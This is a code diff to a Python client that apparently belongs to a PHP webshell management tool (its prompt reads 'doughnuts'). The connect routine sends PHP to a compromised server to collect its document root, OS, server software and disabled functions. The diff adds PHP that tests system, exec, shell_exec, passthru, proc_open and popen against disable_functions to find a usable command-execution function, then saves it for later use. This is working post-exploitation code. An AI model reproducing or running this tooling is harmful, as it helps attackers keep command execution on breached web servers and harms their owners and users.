@@ -2,7 +2,7 @@ from os import path
 from urllib.parse import urlparse
 
 from libs.config import alias, color, gget, gset, set_namespace
-from libs.myapp import is_windows, print_webshell_info, send
+from libs.myapp import is_windows, print_webshell_info, send, get_system_template
 
 """
 url ['webshell']
@@ -21,6 +21,17 @@ webshell.iswin ['webshell'] Whether is windows
 webshell.upload_tmp_dir ['webshell']
 webshell.from_log ['webshell'] Whether connect from log
 """
+
+
+def get_detectd_exec_php():
+    return """$a=array('system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen');
+$disabled = explode(',', ini_get('disable_functions'));
+foreach ($a as $v){
+    if (is_callable($v) && !in_array($v, $disabled)){
+        echo $v;
+        break;
+    }
+}"""
 
 
 @alias(True, "c", u="url", m="method", p="pwd")
@@ -69,6 +80,8 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
             "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions'));"
         )
         info = info_req.r_text.strip().split("|")
+        exec_func = send(get_detectd_exec_php()).r_text.strip()
+        get_system_template(exec_func)
         gset("webshell.root", info[0], namespace="webshell")
         gset("webshell.os_version", info[1], namespace="webshell")
         gset(
@@ -79,6 +92,7 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         gset("webshell.server_version", info[2], namespace="webshell")
         gset("webshell.pwd", info[3], namespace="webshell")
         gset("webshell.prompt", f"doughnuts ({color.cyan(webshell_netloc)}) > ")
+        gset("webshell.exec_func", exec_func, namespace="webshell")
         upload_tmp_dir = info[4]
         if (not upload_tmp_dir):
             if (not is_windows()):
@@ -102,6 +116,8 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         print(color.cyan("Connect success...\n"))
         print_webshell_info()
         set_namespace("webshell", callback=False)
+        if (exec_func == ''):
+            print(color.red("No system execute function!\n"))
         return True
     else:
         print(color.red("Connect failed..."))
